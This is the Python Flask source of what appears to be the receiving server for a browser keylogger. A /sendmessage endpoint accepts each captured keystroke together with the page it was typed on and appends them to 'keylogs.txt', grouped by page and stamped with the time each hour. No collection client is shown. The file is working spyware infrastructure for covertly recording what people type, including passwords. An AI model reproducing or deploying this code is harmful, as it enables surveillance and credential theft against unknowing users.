from flask import Flask, request
from datetime import datetime

app = Flask(__name__)
port = 8000

key_log_file = "keylogs.txt"
last_page = None
previous_datetime = None
seconds_in_hour = 3600


def within_an_hour(current_datetime):
    difference = current_datetime - previous_datetime
    hours = difference.total_seconds() / seconds_in_hour

    return hours <= 1


def record_date():
    global previous_datetime
    now = datetime.now()

    with open(key_log_file, "a") as f:
        if previous_datetime is None or not within_an_hour(now):
            f.write(f"\n{now}\n")
            previous_datetime = now


@app.route("/sendmessage", methods=["POST"])
def send_message():
    global last_page
    message = request.get_json()
    try:
        key = message["key"]
        page = message["page"]
        print(key, page)

        record_date()

        with open(key_log_file, "a") as f:
            if last_page is None:
                f.write(f"[{page}]: {key}")
            elif page == last_page:
                f.write(key)
            else:
                f.write(f"\n[{page}]: {key}")
    
        last_page = page
    except Exception as e:
        print(e)

    return {}


if __name__ == "__main__":
    app.run(port=port, debug=True)
